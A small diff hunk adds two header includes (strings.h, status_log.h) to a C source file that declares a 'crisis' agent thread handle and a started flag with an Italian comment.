@@ -8,6 +8,8 @@
 #include "../../H4DLL/AM_Core.h"
 #include "../../H4DLL/HM_IpcModule.h"
 #include "../../H4DLL/HM_InbundleHook.h"
+#include "../../H4DLL/strings.h"
+#include "../../H4DLL/status_log.h"
 
 HANDLE hCrisisThread = NULL;
 BOOL bPM_CrisisAgentStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
